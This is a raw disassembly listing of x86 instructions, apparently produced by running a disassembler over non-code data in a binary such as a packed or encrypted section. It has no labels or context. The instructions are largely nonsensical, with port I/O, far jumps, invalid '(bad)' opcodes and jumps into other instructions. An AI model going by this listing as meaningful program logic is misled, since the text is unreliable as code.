  405b86:	inc    ecx
  405b87:	and    ecx,DWORD PTR [esi]
  405b89:	loopne 0x405bb9
  405b8b:	dec    ebx
  405b8c:	hlt    
  405b8d:	cmp    BYTE PTR [esi],bh
  405b8f:	in     eax,dx
  405b90:	mov    ah,ch
  405b92:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405b93:	jnp    0x405b3c
  405b95:	dec    esp
  405b96:	and    cl,BYTE PTR [edi]
  405b98:	test   eax,0x8505801
  405b9d:	mov    ds,WORD PTR [ecx+0x43]
  405ba0:	fstp   st(6)
  405ba2:	xor    edx,DWORD PTR [esi+0x5f]
  405ba5:	arpl   WORD PTR [ecx+0x23],cx
  405ba8:	sbb    ebp,esp
  405baa:	ins    DWORD PTR es:[edi],dx
  405bab:	shl    DWORD PTR [esi-0x25],1
  405bae:	inc    edi
  405baf:	call   0xf48f1fb3
  405bb4:	test   eax,0x4774f368
  405bb9:	cli    
  405bba:	shl    BYTE PTR [ebp+0x534ae47e],0x32
  405bc1:	and    eax,0x8e076e0b
  405bc6:	push   ds
  405bc7:	gs mov ecx,0xf91fa35e
  405bcd:	cmp    al,0x70
  405bcf:	out    dx,eax
  405bd0:	jo     0x405bc6
  405bd2:	popa   
  405bd3:	sar    bl,1
  405bd5:	push   esi
  405bd6:	jns    0x405bde
  405bd8:	mov    ebp,0x54400879
  405bdd:	jmp    0x7e76:0x3d1972c4
  405be4:	mov    ecx,DWORD PTR [edi+0x60]
  405be7:	sbb    al,0x9d
  405be9:	loopne 0x405c62
  405beb:	or     esi,DWORD PTR [edx]
  405bed:	int    0x99
  405bef:	mov    edx,0x5e586766
  405bf4:	fisubr DWORD PTR [esi-0x12]
  405bf7:	out    dx,al
  405bf8:	mov    ah,0x99
  405bfa:	cdq    
  405bfb:	inc    eax
  405bfc:	pop    edi
  405bfd:	push   ss
  405bfe:	fisttp WORD PTR [ebx+0xa04faa7]
  405c04:	aaa    
  405c05:	shl    ecx,0x11
  405c08:	pop    eax
  405c09:	mov    edi,0x209d20d1
  405c0e:	les    edx,FWORD PTR [eax-0x46]
  405c11:	imul   edx,DWORD PTR [ebp+0x70],0xb
  405c15:	xor    edx,DWORD PTR [esi+0x561baf9d]
  405c1b:	or     eax,0x30c9b553
  405c20:	out    0xc2,al
  405c22:	add    al,0x4
  405c24:	into   
  405c25:	call   0xa14:0x96cbb88c
  405c2c:	adc    BYTE PTR cs:[ebx],ah
  405c2f:	pop    es
  405c30:	jge    0x405c7d
  405c32:	bound  esi,QWORD PTR ds:0xbd5ecd88
  405c38:	stos   BYTE PTR es:[edi],al
  405c39:	xor    ebx,ecx
  405c3b:	push   ss
  405c3c:	xchg   DWORD PTR [eax+eax*2-0x7],eax
  405c40:	test   al,0xda
  405c42:	push   esp
  405c43:	xchg   edi,eax
  405c44:	mov    bh,0x44
  405c46:	aaa    
  405c47:	test   DWORD PTR [esi-0x5f70aeb0],edi
  405c4d:	xor    eax,0xbcf9ef7
  405c52:	lahf   
  405c53:	adc    BYTE PTR [eax+0x4b5e6806],dl
  405c59:	push   ebx
  405c5a:	sbb    ch,bl
  405c5c:	and    dl,bh
  405c5e:	repnz sub eax,0xb142d8d4
  405c64:	in     eax,0x19
  405c66:	sub    ebp,DWORD PTR [eax]
  405c68:	shr    BYTE PTR [ebx+0x55],cl
  405c6b:	sub    eax,0x37cb2633
  405c70:	mov    cs,WORD PTR [ecx+0xb]
  405c73:	lahf   
  405c74:	daa    
  405c75:	std    
  405c76:	js     0x405bf9
  405c78:	mov    ecx,0x9979dbf2
  405c7d:	fnsave ds:0x67cf5c65
  405c83:	rcl    ecx,cl
  405c85:	in     eax,0x31
  405c87:	addr16 jmp 0xc3de:0x16193c58
  405c8f:	jg     0x405c9f
  405c91:	sub    BYTE PTR [ebx],dl
  405c93:	es aaa 
  405c95:	aad    0xe8
  405c97:	retf   0x8683
  405c9a:	or     BYTE PTR [ebp+0x9dba563],0xab
  405ca1:	lods   eax,DWORD PTR ds:[esi]
  405ca2:	stos   DWORD PTR es:[edi],eax
  405ca3:	sahf   
  405ca4:	(bad)  
  405ca5:	icebp  
  405ca6:	jo     0x405d08
  405ca8:	(bad)  
  405ca9:	or     BYTE PTR [ebx-0x27],ch
  405cac:	sbb    al,0xcd
  405cae:	cdq    
  405caf:	dec    ebp
  405cb0:	rcr    BYTE PTR [edx-0x38],1
  405cb3:	dec    eax
  405cb4:	test   al,0x83
  405cb6:	xor    DWORD PTR [edx+0x17],edi
  405cb9:	test   eax,0x57f6f57f
  405cbe:	sub    eax,0x14141092
  405cc3:	test   DWORD PTR [edx+0x5c],ebx
  405cc6:	cli    
  405cc7:	mov    bl,0x57
  405cc9:	mov    fs:0x738c023d,eax
  405ccf:	jle    0x405d2e
  405cd1:	add    edi,ebp
  405cd3:	cdq    
  405cd4:	jbe    0x405c7e
  405cd6:	or     DWORD PTR [esi-0x3f166afe],ebp
  405cdc:	cwde   
  405cdd:	mov    ebx,0x1df8b50c
  405ce2:	shl    DWORD PTR [ebp+0x7e],0xd6
  405ce6:	sub    edi,esi
  405ce8:	int    0xe1
  405cea:	mov    bl,ah
  405cec:	lods   al,BYTE PTR ds:[esi]
  405ced:	pop    ebp
  405cee:	inc    edx
  405cef:	in     eax,0x8c
  405cf1:	inc    esp
  405cf2:	xchg   ebp,eax
  405cf3:	xchg   ebx,eax
  405cf4:	mov    al,BYTE PTR [ecx-0x106d6f69]
  405cfa:	inc    ebp
  405cfb:	mov    DWORD PTR [eax],eax
  405cfd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405cfe:	imul   esi,DWORD PTR [ebx-0xe794593],0x10
  405d05:	xor    BYTE PTR [edi+0x50df874f],ch
  405d0b:	ret    0xfd66
  405d0e:	push   esp
  405d0f:	pop    ds
  405d10:	out    dx,eax
  405d11:	sbb    ebx,ebx
  405d13:	add    edi,DWORD PTR [ecx+0x59]
  405d16:	ds xchg ebx,eax
  405d18:	(bad)
  405d1c:	repz dec ebp
  405d1e:	arpl   WORD PTR [esi+0x47],bp
  405d21:	pop    ds
  405d22:	cmp    esi,DWORD PTR [eax+0x6b]
  405d25:	mov    al,0xee
  405d27:	jg     0x405d85
  405d29:	popa   
  405d2a:	data16 repz (bad) 
  405d2d:	retf   0x3d79
  405d30:	xchg   ecx,eax
  405d31:	aaa    
  405d32:	mov    ch,0x6c
  405d34:	aaa    
  405d35:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405d36:	iret   
  405d37:	xchg   edi,eax
  405d38:	shl    DWORD PTR [esp+ebx*1+0x7ca5bda8],0xcf
  405d40:	enter  0x5c9d,0xb7
  405d44:	popf   
  405d45:	in     al,0x89
  405d47:	inc    ebx
  405d48:	cld    
  405d49:	pop    ebp
  405d4a:	dec    esp
  405d4b:	aam    0x5b
  405d4d:	xor    ebp,edi
  405d4f:	(bad)  
  405d51:	xchg   DWORD PTR [esi+0x2d],eax
  405d54:	mov    bl,0x4b
  405d56:	push   cs
  405d57:	xchg   edx,eax
  405d58:	dec    esp
  405d59:	mov    es,WORD PTR [eax+0x522e4e77]
  405d5f:	loop   0x405dd6
  405d61:	and    dh,BYTE PTR [edi+edx*4+0x2]
  405d65:	sahf   
  405d66:	mov    eax,0x3b548c39
  405d6b:	xchg   DWORD PTR cs:[edx+0x1804ca38],esi
  405d72:	enter  0xc17b,0xde
  405d76:	push   ebx
  405d77:	and    BYTE PTR ds:0x2610df20,bl
  405d7d:	sub    al,0x8
  405d7f:	push   esi
  405d80:	(bad)  [ebx]
  405d82:	je     0x405d54
  405d84:	xor    esi,edx
  405d86:	imul   DWORD PTR [eax+0x7e4a04fc]
  405d8c:	test   eax,0xf8737b8e
  405d91:	lahf   
  405d92:	or     DWORD PTR [ebp+0x8],edx
  405d95:	sub    al,BYTE PTR [ebp+ecx*8-0x6d45f316]
  405d9c:	retf   
  405d9d:	sub    esi,DWORD PTR [edx+edi*1-0x79]
  405da1:	in     eax,0xc9
  405da3:	call   0x2bd4:0x14d1db2f
  405daa:	mov    ch,0x73
  405dac:	aaa    
  405dad:	out    dx,eax
  405dae:	xor    ch,dh
  405db0:	test   BYTE PTR [edx],0xb2
  405db3:	push   0x51
  405db5:	das    
  405db6:	pop    esp
  405db7:	xchg   ebx,eax
  405db8:	push   0x49
  405dba:	scas   eax,DWORD PTR es:[edi]
  405dbb:	repz fist DWORD PTR [ecx+0x20eee477]
  405dc2:	scas   al,BYTE PTR es:[di]
  405dc4:	test   BYTE PTR [eax+ebx*4+0x7cf4bf1f],al
  405dcb:	and    eax,0xc667c923
  405dd0:	js     0x405db9
  405dd2:	xchg   esi,eax
  405dd3:	sbb    ebp,ebx
  405dd5:	xchg   ecx,eax
  405dd6:	out    0xb9,eax
  405dd8:	imul   DWORD PTR [edx*8+0x25949ece]
  405ddf:	adc    al,0xf5
  405de1:	fisub  WORD PTR [ecx]
  405de3:	sbb    al,0xbf
  405de5:	cmp    edi,DWORD PTR [edi]
  405de7:	sub    DWORD PTR [ecx-0x4375cda1],0x41ad2bd
  405df1:	mov    BYTE PTR [esp+eiz*4-0x47d5b7bc],ch
  405df8:	pusha  
  405df9:	loopne 0x405e47
  405dfb:	sbb    eax,0x3d937b72
  405e00:	lods   al,BYTE PTR ss:[esi]
  405e02:	sbb    al,0x13
  405e04:	scas   al,BYTE PTR es:[edi]
  405e05:	xor    edx,DWORD PTR [ecx]
  405e07:	aad    0x62
  405e09:	mov    dh,0xe
  405e0b:	push   0x197fac7f
  405e10:	retf   
  405e11:	ja     0x405de3
  405e13:	push   es
  405e14:	fnsave [ebp+0x46b835bf]
  405e1a:	adc    esp,DWORD PTR [edi+0x55]
  405e1d:	lods   eax,DWORD PTR ds:[esi]
  405e1e:	enter  0x4ce3,0x72
  405e22:	or     bl,BYTE PTR [esi]
  405e24:	xchg   edi,eax
  405e25:	pop    ebx
  405e26:	out    0xc8,al
  405e28:	and    eax,0xbe1f28a7
  405e2d:	jns    0x405e35
  405e2f:	push   ebx
  405e30:	imul   ebp,DWORD PTR [edx+0x671b8b9b],0xb5ef3799
  405e3a:	add    bl,cl
  405e3c:	push   0xffffffaa
  405e3e:	fist   WORD PTR [ecx]
  405e40:	mov    ebx,0xe0c2bfc
  405e45:	xchg   esp,eax
  405e46:	addr16 push es
  405e48:	sub    eax,0x4c0584b3
  405e4d:	cmc    
  405e4e:	cmp    DWORD PTR [ebp+0x14903c4f],ebx
  405e54:	mov    bh,0x24
  405e56:	xchg   edi,eax
  405e57:	lea    eax,[eax+0x6d]
  405e5a:	test   BYTE PTR [ecx-0x13],ch
  405e5d:	lds    edx,FWORD PTR [ebx+0x47]
  405e60:	sbb    ch,BYTE PTR [edx+0x7c6b5fa6]
  405e66:	push   esi
  405e67:	cmp    ebp,DWORD PTR [ebx]
  405e69:	xchg   BYTE PTR [si],bh
  405e6c:	hlt    
  405e6d:	and    BYTE PTR [edi-0x327ba01f],bl
  405e73:	xchg   ebp,eax
  405e74:	test   BYTE PTR [edx],dh
  405e76:	(bad)  
  405e77:	pop    ecx
  405e78:	dec    ebx
  405e79:	push   0xffffffe5
  405e7b:	shr    DWORD PTR [eax+ecx*4],1
  405e7e:	(bad)  
  405e7f:	iret   
  405e80:	(bad)  
  405e81:	sbb    dh,ch
  405e83:	push   ss
  405e84:	neg    BYTE PTR [edx]
  405e86:	sub    DWORD PTR [ebx+0x22],0xffffff83
  405e8a:	std    
  405e8b:	mov    edx,0xf9118103
  405e90:	push   esp
  405e91:	mov    edi,0x6c581aa3
  405e96:	xor    BYTE PTR [ebx+0x2b],ch
  405e99:	push   ecx
  405e9a:	repnz and ebp,DWORD PTR [ecx+esi*2-0x21cecfb7]
  405ea2:	into   
  405ea3:	pusha  
  405ea4:	or     BYTE PTR [esi-0x62],0xc
  405ea8:	clc    
  405ea9:	sub    ebx,DWORD PTR [eax-0x4f398ffe]
  405eaf:	xchg   DWORD PTR [esi+esi*2+0x21533190],ecx
  405eb6:	jl     0x405f20
  405eb8:	leave  
  405eb9:	jp     0x405e4e
  405ebb:	cdq    
  405ebc:	arpl   ax,dx
  405ebe:	mov    ebx,ebx
  405ec0:	inc    ebx
  405ec1:	push   ecx
  405ec2:	sbb    DWORD PTR [ecx+0x14],0xf2cdda68
  405ec9:	and    al,0x1c
  405ecb:	fisttp WORD PTR ss:[edx]
  405ece:	aas    
  405ecf:	hlt    
  405ed0:	sub    esi,DWORD PTR [esp+esi*1+0x71]
  405ed4:	add    cl,BYTE PTR [edi+0x38]
  405ed7:	hlt    
  405ed8:	call   0x9053:0xff1328ff
  405edf:	fdivrp st(7),st
  405ee1:	pop    ecx
  405ee2:	mov    fs,WORD PTR [ecx]
  405ee4:	jb     0x405f5e
  405ee6:	add    DWORD PTR [edi],esi
  405ee8:	shl    BYTE PTR [ebp+0x7d],cl
  405eeb:	ss pop ecx
  405eed:	push   ebp
  405eee:	adc    al,0xa1
  405ef0:	loop   0x405f5a
  405ef2:	scas   eax,DWORD PTR es:[edi]
  405ef3:	sti    
  405ef4:	sbb    al,0x1e
  405ef6:	xchg   edi,eax
  405ef7:	and    al,0x3d
  405ef9:	imul   ebx,ecx,0x609141b8
  405eff:	gs aaa 
  405f01:	ss aam 0x39
  405f04:	sub    cl,BYTE PTR [eax+0x6f]
  405f07:	pop    ss
  405f08:	and    DWORD PTR [edx-0x25],esi
  405f0b:	lods   al,BYTE PTR ds:[esi]
  405f0c:	setnp  BYTE PTR [edi+0x5c25fa08]
  405f13:	xchg   BYTE PTR [ebx-0xa372ab1],al
  405f19:	fs out 0xd9,eax
  405f1c:	int3   
  405f1d:	ss xor al,0xfb
  405f20:	pushf  
  405f21:	in     eax,0xa2
  405f23:	in     al,0x24
  405f25:	jne    0x405eba
  405f27:	pop    eax
  405f28:	jno    0x405f62
  405f2a:	or     dl,BYTE PTR [eax+0x5bd4c7f5]
  405f30:	in     eax,dx
  405f31:	scas   eax,DWORD PTR es:[edi]
  405f32:	ret    
  405f33:	push   cs
  405f34:	in     al,0x9d
  405f36:	lods   al,BYTE PTR ds:[esi]
  405f37:	or     bl,dl
  405f39:	sbb    al,0xf8
  405f3b:	aam    0x21
  405f3d:	icebp  
  405f3e:	add    al,0x58
  405f41:	dec    eax
  405f42:	mov    ds:0xd87f0d01,eax
  405f47:	not    BYTE PTR [edi]
  405f49:	rcl    DWORD PTR [edi-0xcc05250],cl
  405f4f:	arpl   WORD PTR [edi-0x4d9eeb2b],si
  405f55:	jg     0x405f66
  405f57:	test   eax,0xe3fd849b
  405f5c:	pop    ecx
  405f5d:	or     esp,ebp
  405f5f:	mov    edx,0x9b7420c3
  405f64:	addr16 mov ds:0xeba7,al
  405f68:	arpl   WORD PTR [edx],bx
  405f6a:	sahf   
  405f6b:	pusha  
  405f6c:	dec    esi
  405f6d:	cmp    al,0xc9
  405f6f:	sub    bl,0xfe
  405f72:	cld    
  405f73:	xchg   ebp,eax
  405f74:	ds pusha 
  405f76:	ja     0x405f99
  405f78:	(bad)  
  405f79:	das    
  405f7a:	or     BYTE PTR [edi+0x6df0f485],bl
  405f80:	inc    esi
  405f81:	push   ss
  405f82:	test   ebx,esi
  405f84:	mov    ds:0xd3093bb1,eax
  405f89:	ins    BYTE PTR es:[edi],dx
  405f8a:	fcmovnbe st,st(3)
  405f8c:	xchg   esp,eax
  405f8d:	inc    esp
  405f8e:	mov    dl,0x6e
  405f90:	nop
  405f91:	xchg   BYTE PTR [esi],cl
  405f93:	ret    0x1f27
  405f96:	pop    eax
  405f97:	add    BYTE PTR [esp+eiz*8],0x1c
  405f9b:	and    DWORD PTR [edi],edi
  405f9d:	mov    al,0x2b
  405f9f:	in     al,0x5d
  405fa1:	popf   
  405fa2:	xchg   edx,eax
  405fa3:	xchg   edi,eax
  405fa4:	dec    esp
  405fa5:	dec    esp
  405fa6:	or     edi,eax
  405fa8:	or     BYTE PTR [edi+ebp*2+0x2c],al
  405fac:	push   edx
  405fad:	mov    esi,0xd0dbf39
  405fb2:	mov    ebp,0x783937a7
  405fb7:	je     0x405f56
  405fb9:	ins    BYTE PTR es:[edi],dx
  405fba:	idiv   DWORD PTR [esi+0x28572e7c]
  405fc0:	ins    BYTE PTR es:[edi],dx
  405fc1:	mov    dh,dh
  405fc3:	jae    0x406042
  405fc5:	in     al,dx
  405fc6:	cmp    BYTE PTR [edx],bl
  405fc8:	in     eax,dx
  405fc9:	jno    0x405f81
  405fcb:	push   0xffffff9c
  405fcd:	mov    ebp,0x61032d5b
  405fd2:	shl    dl,1
  405fd4:	jecxz  0x405fd3
  405fd6:	rol    DWORD PTR [ebx-0x23ba0ba0],0xc9
  405fdd:	inc    esi
  405fde:	ret    0xce89
  405fe1:	lahf   
  405fe2:	jbe    0x405f88
  405fe4:	jg     0x405f7c
  405fe6:	in     eax,0xa3
  405fe8:	mov    dl,0x50
  405fea:	mov    esi,0xf2fcc86
  405fef:	icebp  
  405ff0:	in     eax,dx
  405ff1:	inc    ecx
  405ff2:	cmp    eax,0x8c226e7d
  405ff7:	jle    0x405fd1
  405ff9:	or     al,0x3d
  405ffb:	and    ah,ch
  405ffd:	fld    TBYTE PTR [esi]
  405fff:	call   0xbb45:0xce14bdd4
  406006:	mov    edi,0x73d26b1f
  40600b:	in     al,dx
  40600c:	sbb    BYTE PTR [esi-0x79],dh
  40600f:	call   0x27cd8b75
  406014:	ror    DWORD PTR [ebx-0x5d],cl
  406017:	add    ch,dh
  406019:	dec    ebx
  40601a:	xchg   esi,eax
  40601b:	dec    ecx
  40601c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40601d:	inc    eax
  40601e:	mov    esi,0xa28a3243
  406023:	es adc eax,0x89518986
  406029:	mov    ah,0xcc
  40602b:	dec    eax
  40602c:	enter  0xb637,0x22
  406030:	daa    
  406031:	and    eax,0x9ca833c6
  406036:	loopne 0x405fcb
  406038:	rol    DWORD PTR [ebx+ebx*2+0x57],cl
  40603c:	enter  0x5292,0x7f
  406040:	clc    
  406041:	gs das 
  406043:	cli    
  406044:	mov    ds:0x2df01b11,al
  406049:	sbb    dh,BYTE PTR [edx-0x1054c787]
  40604f:	lock sbb DWORD PTR [edx+0x37],esp
  406053:	test   al,0xe5
  406055:	and    cl,bh
  406057:	inc    eax
  406058:	stos   BYTE PTR es:[edi],al
  406059:	pop    es
  40605a:	ja     0x40606f
  40605c:	push   esp
  40605d:	lods   al,BYTE PTR ds:[esi]
  40605e:	mov    al,0x7b
  406060:	enter  0xf4c1,0x1d
  406064:	into   
  406065:	test   esi,edi
  406067:	lock or ch,BYTE PTR [esi-0x5643ccd6]
  40606e:	mov    esi,0xcc883de3
  406073:	leave  
  406074:	add    ebx,DWORD PTR [eax+eiz*1]
  406077:	scas   eax,DWORD PTR es:[edi]
  406078:	inc    esp
  406079:	push   0x5240db48
  40607e:	out    0xa0,al
  406080:	bound  eax,QWORD PTR [esi-0x7cbebcb9]
  406086:	enter  0xb6bb,0xc9
  40608a:	popf   
  40608b:	pop    eax
  40608c:	das    
  40608d:	mov    ebp,0x1deb5f22
  406092:	sub    al,0x91
  406094:	iret   
  406095:	jle    0x40605c
  406097:	xchg   DWORD PTR [ebp+0x7d11df52],eax
  40609d:	add    al,0xbe
  40609f:	push   es
  4060a0:	enter  0x6d2e,0xb7
  4060a4:	ja     0x406086
  4060a6:	or     al,0x67
  4060a9:	xchg   ebp,eax
  4060aa:	xor    esi,DWORD PTR [edi+0x9]
  4060ad:	fistp  DWORD PTR [ebx-0x666d57ee]
  4060b3:	mov    gs,WORD PTR [esi]
  4060b5:	ret    0xd995
  4060b8:	or     DWORD PTR [edi-0x9cbf4e4],0xa586ca8
  4060c2:	lock ins BYTE PTR es:[edi],dx
  4060c4:	xchg   DWORD PTR [ecx-0x797a9436],esi
  4060ca:	into   
  4060cb:	clc    
  4060cc:	in     al,0x2b
  4060ce:	out    dx,eax
  4060cf:	fstp   st(6)
  4060d1:	jnp    0x406095
  4060d3:	ja     0x4060ee
  4060d5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4060d6:	xor    eax,0x9a5ce635
  4060db:	scas   eax,DWORD PTR es:[edi]
  4060dc:	mov    ds:0x6720f0fe,eax
  4060e1:	imul   esp,DWORD PTR [edi-0x5151d841],0xffffffa7
  4060e8:	pop    ss
  4060e9:	push   ss
  4060ea:	repnz add BYTE PTR [edx+0x25],0xe4
  4060ef:	sub    eax,0x82b9b1f3
  4060f4:	jb     0x4060dc
  4060f6:	sbb    al,0x21
  4060f8:	xor    eax,0x358817a7
  4060fd:	stos   DWORD PTR es:[edi],eax
  4060fe:	xchg   ebp,eax
  4060ff:	repnz add ecx,DWORD PTR [ecx+eax*2+0x66a3583c]
  406107:	adc    al,0x51
  406109:	fcmovb st,st(7)
  40610b:	pusha  
  40610c:	into   
  40610d:	xchg   BYTE PTR [esi+0x11cb0ed7],ah
  406113:	scas   eax,DWORD PTR es:[edi]
  406114:	in     al,dx
  406115:	cld    
  406116:	sar    DWORD PTR [ebx],1
  406118:	or     ch,ch
  40611a:	ins    BYTE PTR es:[edi],dx
  40611b:	jbe    0x40615e
  40611d:	dec    ebp
  40611e:	cmp    bl,dl
  406120:	les    ebp,FWORD PTR [esi]
  406122:	(bad)
  406125:	inc    ecx
  406126:	mov    dl,0x2a
  406128:	hlt    
  406129:	mov    ah,0x62
  40612b:	loopne 0x4060d1
  40612d:	mov    BYTE PTR [ebp-0xd],dl
  406130:	rcl    DWORD PTR ds:0xa2a1e4ae,1
  406136:	std    
  406137:	es and eax,0xf97b47d9
  40613d:	and    DWORD PTR [esi+0x38],edx
  406140:	enter  0x8970,0x77
  406144:	mov    bh,0x19
  406146:	neg    BYTE PTR [esi+0x5d4f9fea]
  40614c:	fadd   DWORD PTR [eax+0x1c]
  40614f:	test   eax,0xe2e93e93
  406154:	rol    DWORD PTR [eax+0x50],1
  406157:	push   ebx
  406158:	mov    ecx,0x7f7fe1b6
  40615d:	popa   
  40615e:	mov    WORD PTR cs:[edi-0x64f402f9],?
  406165:	sub    eax,0xd2c68b78
  40616a:	dec    esi
  40616b:	js     0x406104
  40616d:	aas    
  40616e:	stos   BYTE PTR es:[edi],al
  40616f:	sub    BYTE PTR [edx],cl
  406171:	sub    bl,ah
  406173:	mov    dh,0x8
  406175:	ror    BYTE PTR [ecx-0xccb023c],cl
  40617b:	and    BYTE PTR [esi+ecx*4+0x68],bl
  40617f:	dec    eax
  406180:	or     dl,BYTE PTR [ebx]
  406182:	mov    ecx,0x73292df9
  406187:	cmp    DWORD PTR [esi-0xa],ebx
  40618a:	enter  0xe49a,0x4e
  40618e:	dec    ebp
  40618f:	into   
  406190:	push   ss
  406191:	js     0x406122
  406193:	jo     0x40615f
  406195:	(bad)  
  406196:	push   es
  406197:	dec    edx
  406198:	fisubr DWORD PTR [esi+0x31db6279]
  40619e:	lahf   
  40619f:	pop    edi
  4061a0:	xchg   esp,eax
  4061a1:	mov    eax,0xc3f06d7c
  4061a6:	bound  eax,QWORD PTR [ebx]
  4061a8:	adc    ebx,esi
  4061aa:	adc    eax,0xfbcef98c
  4061af:	or     al,0x45
  4061b1:	ins    DWORD PTR es:[edi],dx
  4061b2:	repnz push ss
  4061b4:	ins    BYTE PTR es:[edi],dx
  4061b5:	push   0xffffffa8
  4061b7:	out    dx,eax
  4061b8:	mov    bh,0xdb
  4061ba:	xchg   edi,eax
  4061bb:	mov    eax,ds:0x33b99c97
  4061c0:	aas    
  4061c1:	test   DWORD PTR [edi+0x16],esi
  4061c4:	idiv   DWORD PTR [edx-0x40]
  4061c7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4061c8:	xchg   DWORD PTR [eax+0x650ce7a7],eax
  4061ce:	push   ebx
  4061cf:	retf   
  4061d0:	sbb    eax,0x861525f
  4061d5:	mov    dh,0xd4
  4061d7:	and    eax,0x2a8fb08f
  4061dc:	mov    ebp,0x6d9fe6fa
  4061e1:	xchg   ecx,eax
  4061e2:	ja     0x40624d
  4061e4:	jmp    0x939c:0x7dba57fd
  4061eb:	mov    ebx,0x23986c74
  4061f0:	or     al,0xce
  4061f2:	ret    0x31a1
  4061f5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4061f6:	xchg   esp,eax
  4061f7:	push   ebx
  4061f8:	mov    al,0xab
  4061fa:	(bad)  [ebx+0x350367dc]
  406200:	or     bh,cl
  406202:	mov    esp,0x66f155f2
  406207:	int    0xb
  406209:	neg    esp
  40620b:	js     0x406275
  40620d:	push   ebx
  40620e:	aad    0xc3
  406210:	sub    bh,BYTE PTR [eax-0x1d]
  406213:	push   esp
  406214:	jg     0x406215
  406216:	in     al,dx
  406217:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406218:	xor    esi,DWORD PTR [esi]
  40621a:	mov    ah,0xad
  40621c:	adc    DWORD PTR [esi-0x26],0x12409a32
  406223:	add    esp,esp
  406225:	fwait
  406226:	hlt    
  406227:	sbb    al,0x88
  406229:	xchg   ecx,eax
  40622a:	push   ds
  40622b:	fsub   QWORD PTR [ebp+0x3f]
  40622e:	aaa    
  40622f:	pop    esp
  406230:	cmc    
  406231:	sahf   
  406232:	es xor ecx,ebx
  406235:	das    
  406236:	mov    dh,0xce
  406238:	int    0xde
  40623a:	cli    
  40623b:	mov    ebx,0xdbc16de7
  406240:	cmp    ch,BYTE PTR ds:0x9f062467
  406246:	sbb    dl,BYTE PTR ds:0xac1966b5
  40624c:	dec    ebp
  40624d:	ror    BYTE PTR [edx],cl
  40624f:	test   BYTE PTR [eax-0x62],al
  406252:	repnz mov ch,0x22
  406255:	ss or  eax,0x53809c68
  40625b:	aas    
  40625c:	jge    0x4062aa
  40625e:	popf   
  40625f:	pop    esi
  406260:	jmp    0xcd4b12de
  406265:	mov    al,0x2c
  406267:	std    
  406268:	jnp    0x4061ee
  40626a:	add    ah,BYTE PTR [ecx]
  40626c:	cld    
  40626d:	xchg   esp,eax
  40626e:	aaa    
  40626f:	ins    BYTE PTR es:[edi],dx
  406270:	popa   
  406271:	inc    esi
  406272:	jmp    0x6380:0x16d5aabd
  406279:	sub    eax,0x3520527f
  40627e:	sti    
  40627f:	cmp    eax,0x4fd16cf7
  406284:	xor    dh,dl
  406286:	sbb    eax,DWORD PTR [esi+0x9]
  406289:	dec    BYTE PTR [eax-0xa]
  40628c:	int    0xe3
  40628e:	jmp    0x406258
  406290:	jae    0x40629c
  406292:	daa    
  406293:	pop    ecx
  406294:	sbb    bh,BYTE PTR [ebp+ebp*8+0x54]
  406298:	pop    es
  406299:	mov    al,0x33
  40629b:	or     eax,0xcce9e001
  4062a0:	test   DWORD PTR [ebx],edi
  4062a2:	(bad)  
  4062a3:	jbe    0x406311
  4062a5:	push   cs
  4062a6:	outs   dx,DWORD PTR ds:[esi]
  4062a7:	ret    0xd186
  4062aa:	jg     0x40628b
  4062ac:	cmp    eax,DWORD PTR [eax+0x2dc65456]
  4062b2:	xor    cl,ah
  4062b4:	data16 mov ch,0x3c
  4062b7:	pop    ecx
  4062b8:	xor    DWORD PTR [ebx-0x68],eax
  4062bb:	int    0xe0
  4062bd:	sub    esi,DWORD PTR [edi+ebp*8+0x5e]
  4062c1:	dec    eax
  4062c2:	in     al,dx
  4062c3:	pusha  
  4062c4:	pop    eax
  4062c5:	ins    BYTE PTR es:[edi],dx
  4062c6:	hlt    
  4062c7:	ja     0x406315
  4062c9:	cmp    al,0x12
  4062cb:	cmp    edi,DWORD PTR [edi]
  4062cd:	int3   
  4062ce:	or     eax,0xae8b803c
  4062d3:	nop
  4062d4:	inc    ebx
  4062d5:	popf   
  4062d6:	(bad)  
  4062d7:	jb     0x406357
  4062d9:	xchg   BYTE PTR [ebx*1-0x14afb5d2],ah
  4062e0:	dec    edi
  4062e1:	or     al,0x7
  4062e3:	lahf   
  4062e4:	ja     0x4062e8
  4062e6:	sub    cl,BYTE PTR [edi]
  4062e8:	pop    esp
  4062e9:	adc    edi,DWORD PTR [ebx+ecx*1-0x7220096d]
  4062f0:	or     ebp,edx
  4062f2:	and    cl,al
  4062f4:	adc    ch,BYTE PTR [eax-0x69]
  4062f7:	dec    eax
  4062f8:	push   ebx
  4062f9:	sub    DWORD PTR [esi+0x5c],eax
  4062fc:	ret    0xca5a
  4062ff:	loopne 0x40633f
  406301:	mov    eax,0xb504c508
  406306:	pop    ecx
  406307:	rcr    BYTE PTR [ecx],cl
  406309:	out    0x38,eax
  40630b:	mov    ah,0xb6
  40630d:	mov    eax,0x12c093cb
  406312:	mov    edi,DWORD PTR es:[ebp+esi*2-0x696215a9]
  40631a:	ficom  WORD PTR ds:0xf510dd37
  406320:	mov    ds:0x5d9a1a54,eax
  406325:	add    DWORD PTR [ecx+0x28],ecx
  406328:	mov    esi,0xe3e5791e
  40632d:	in     al,0xf3
  40632f:	xchg   edi,eax
  406330:	lods   eax,DWORD PTR ds:[esi]
  406331:	pop    ss
  406332:	jns    0x406314
  406334:	daa    
  406335:	inc    esp
  406336:	cmp    BYTE PTR [ecx+0x62],ch
  406339:	stos   DWORD PTR es:[edi],eax
  40633a:	push   ds
  40633b:	and    esp,DWORD PTR [edi+0x6c]
  40633e:	inc    ebp
  40633f:	out    0xaa,al
  406341:	ins    BYTE PTR es:[edi],dx
  406342:	push   esi
  406343:	ja     0x406308
  406345:	cmp    DWORD PTR [edi],0xffffff97
  406348:	sti    
  406349:	adc    ebx,edx
  40634b:	pop    ebp
  40634c:	aam    0x32
  40634e:	in     eax,0x4
  406350:	jns    0x406319
  406352:	inc    edi
  406353:	adc    esi,DWORD PTR [ecx]
  406355:	and    esi,DWORD PTR [eax+0x1a]
  406358:	pusha  
  406359:	xor    dl,BYTE PTR [ebp-0x31]
  40635c:	loopne 0x40631b
